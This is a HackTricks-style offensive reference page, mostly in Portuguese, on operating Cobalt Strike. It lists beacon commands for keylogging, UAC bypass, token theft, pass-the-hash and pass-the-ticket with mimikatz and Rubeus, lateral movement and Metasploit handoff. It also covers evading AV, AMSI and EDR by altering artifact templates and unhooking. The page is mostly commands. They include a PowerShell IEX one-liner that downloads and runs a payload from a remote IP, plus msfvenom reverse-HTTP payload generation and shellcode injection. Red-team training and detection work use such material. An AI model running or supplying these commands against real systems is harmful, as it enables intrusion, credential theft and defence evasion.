# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, qual tipo de beacon usar (http, dns, smb...) e mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam se comunicar diretamente com o C2; eles podem se comunicar com ele através de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` então você precisa selecionar os beacons TCP ou SMB

* The **TCP beacon will set a listener in the port selected**. Para conectar a um beacon TCP use o comando `connect <ip> <port>` de outro beacon
* The **smb beacon will listen in a pipename with the selected name**. Para conectar a um SMB beacon você precisa usar o comando `link [target] [pipe]`.

### Gerar & Hospedar payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento Office com macro
* **`Windows Executable`** para um .exe, .dll ou service .exe
* **`Windows Executable (S)`** para um **stageless** .exe, .dll ou service .exe (melhor stageless do que staged, menos IoCs)

#### Gerar & Hospedar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso vai gerar um script/executável para baixar o beacon do Cobalt Strike em formatos como: bitsadmin, exe, powershell e python

#### Hospedar payloads

Se você já tem o arquivo que quer hospedar em um servidor web, vá para `Attacks -> Web Drive-by -> Host File` e selecione o arquivo a ser hospedado e a configuração do web server.

### Beacon Options

<details>
<summary>Beacon opções e comandos</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Implantes personalizados / Linux Beacons

- Um agente customizado só precisa falar o protocolo HTTP/S do Cobalt Strike Team Server (malleable C2 profile padrão) para registrar/check-in e receber tarefas. Implemente os mesmos URIs/headers/metadata/crypto definidos no profile para reutilizar a UI do Cobalt Strike para tasking e output.
- Um Aggressor Script (por exemplo, `CustomBeacon.cna`) pode encapsular a geração de payloads para o beacon não-Windows, permitindo que operadores selecionem o listener e gerem ELF payloads diretamente da GUI.
- Exemplos de handlers de tarefas Linux expostos ao Team Server: `sleep`, `cd`, `pwd`, `shell` (executa comandos arbitrários), `ls`, `upload`, `download` e `exit`. Estes mapeiam para IDs de tarefa esperados pelo Team Server e devem ser implementados no lado do servidor para retornarem a saída no formato adequado.
- Suporte a BOF no Linux pode ser adicionado carregando Beacon Object Files in-process com o [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (também suporta Outflank-style BOFs), permitindo pós-exploração modular rodando no contexto/privilégios do implante sem spawnar novos processos.
- Incorpore um handler SOCKS no beacon customizado para manter paridade de pivot com os Windows Beacons: quando o operador roda `socks <port>` o implante deve abrir um proxy local para rotear as ferramentas do operador através do host Linux comprometido para dentro de redes internas.

## Opsec

### Execute-Assembly

O **`execute-assembly`** usa um **processo sacrificial** via remote process injection para executar o programa indicado. Isso é muito ruidoso, pois para injetar dentro de um processo são usadas certas Win APIs que todo EDR está verificando. No entanto, existem algumas ferramentas customizadas que podem ser usadas para carregar algo no mesmo processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- No Cobalt Strike você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

O agressor script `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike, que coloca cores nos comandos indicando se são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injection ou similares (vermelho). Isso ajuda a saber quais comandos são mais stealthy.

### Atue como o usuário

Você pode checar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Verifique todos os logons interativos para conhecer o horário usual de operação.
- System EID 12,13 - Verifique a frequência de shutdown/startup/sleep.
- Security EID 4624/4625 - Verifique tentativas NTLM válidas/inválidas de entrada.
- Security EID 4648 - Este evento é gerado quando credenciais em texto plano são usadas para logon. Se um processo gerou esse evento, o binário potencialmente tem as credenciais em texto claro em um arquivo de configuração ou dentro do código.

Ao usar `jump` a partir do Cobalt Strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.

### Use contas de computador

É comum defensores verificarem comportamentos estranhos gerados por usuários e **excluírem service accounts e computer accounts como `*$` do monitoramento**. Você pode usar essas contas para movimento lateral ou escalada de privilégio.

### Use stageless payloads

Stageless payloads são menos ruidosos do que staged ones porque não precisam baixar um segundo estágio do C2 server. Isso significa que não geram tráfego de rede após a conexão inicial, tornando-os menos propensos a serem detectados por defesas baseadas em rede.

### Tokens & Token Store

Tenha cuidado ao roubar ou gerar tokens porque pode ser possível para um EDR enumerar todos os tokens de todas as threads e encontrar um **token pertencente a outro usuário** ou até SYSTEM dentro do processo.

Isso permite armazenar tokens **por beacon** para não ser necessário roubar o mesmo token repetidas vezes. Isso é útil para movimento lateral ou quando você precisa usar um token roubado várias vezes:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Ao mover lateralmente, geralmente é melhor **roubar um token do que gerar um novo** ou executar um ataque pass the hash.

### Guardrails

O Cobalt Strike tem um recurso chamado **Guardrails** que ajuda a prevenir o uso de certos comandos ou ações que poderiam ser detectados por defensores. Guardrails pode ser configurado para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec` e outros que são comumente usados para movimento lateral ou escalada de privilégio.

Além disso, o repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas checagens e ideias que você pode considerar antes de executar um payload.

### Tickets encryption

Em um AD tenha cuidado com a criptografia dos tickets. Por padrão, algumas ferramentas usarão RC4 para criptografar tickets Kerberos, que é menos seguro que AES; ambientes atualizados por padrão usarão AES. Isso pode ser detectado por defensores que monitoram por algoritmos de criptografia fracos.

### Avoid Defaults

Ao usar Cobalt Strike por padrão os pipes SMB terão os nomes `msagent_####` e `status_####`. Mude esses nomes. É possível checar os nomes dos pipes existentes no Cobalt Strike com o comando: `ls \\.\pipe\`

Além disso, com sessões SSH um pipe chamado `\\.\pipe\postex_ssh_####` é criado. Mude-o com `set ssh_pipename "<new_name>";`.

Também em ataques de postex exploitation os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.

Em perfis do Cobalt Strike você também pode modificar coisas como:

- Evitar usar `rwx`
- Como o comportamento de process injection funciona (quais APIs serão usadas) no bloco `process-inject {...}`
- Como o "fork and run" funciona no bloco `post-ex {…}`
- O tempo de sleep
- O tamanho máximo de binários a serem carregados em memória
- O footprint de memória e conteúdo de DLL com o bloco `stage {...}`
- O tráfego de rede

### Bypass memory scanning

Alguns EDRs escaneiam memória em busca de assinaturas conhecidas de malware. Cobalt Strike permite modificar a função `sleep_mask` como um BOF que conseguirá encriptar em memória a backdoor.

### Noisy proc injections

Ao injetar código em um processo isso normalmente é muito ruidoso, porque **nenhum processo regular normalmente realiza essa ação e as formas de fazer isso são muito limitadas**. Portanto, isso pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, pode também ser detectado por EDRs que escaneiam a rede por **threads contendo código que não está em disco** (embora processos como browsers que usam JIT façam isso comumente). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Ao spawnar um novo processo é importante **manter uma relação parent-child regular** entre processos para evitar detecção. Se svchost.exec está executando iexplorer.exe vai parecer suspeito, já que svchost.exe não é pai de iexplorer.exe em um ambiente Windows normal.

Quando um novo beacon é spawnado no Cobalt Strike por padrão um processo usando **`rundll32.exe`** é criado para rodar o novo listener. Isso não é muito stealthy e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem args tornando-o ainda mais suspeito.

Com o seguinte comando do Cobalt Strike, você pode especificar um processo diferente para spawnar o novo beacon, tornando-o menos detectável:
```bash
spawnto x86 svchost.exe
```
Você também pode alterar essa configuração **`spawnto_x86` e `spawnto_x64`** em um perfil.

### Proxying do tráfego dos atacantes

Às vezes os atacantes precisarão executar ferramentas localmente, mesmo em máquinas Linux, e fazer com que o tráfego das vítimas alcance a ferramenta (por exemplo, NTLM relay).

Além disso, para realizar um ataque pass-the.hash ou pass-the-ticket, é mais furtivo para o atacante **adicionar esse hash ou ticket ao seu próprio processo LSASS** localmente e então pivotar a partir dele, em vez de modificar o processo LSASS de uma máquina vítima.

No entanto, é preciso ter **cuidado com o tráfego gerado**, pois você pode estar enviando tráfego incomum (Kerberos?) a partir do seu processo backdoor. Para isso você poderia pivotar para um processo de browser (embora possa ser detectado ao se injetar em um processo, então pense em uma forma furtiva de fazer isso).


### Evitando AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike para usar os recursos do disco que queremos e não os que estão carregados.

#### Resource Kit

A pasta ResourceKit contém os templates para os payloads baseados em script do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os templates você pode encontrar o que o defender (AMSI neste caso) não gosta e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Referências

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 — análise da criptografia de metadados do Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [Diário do SANS ISC sobre o tráfego do Cobalt Strike](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
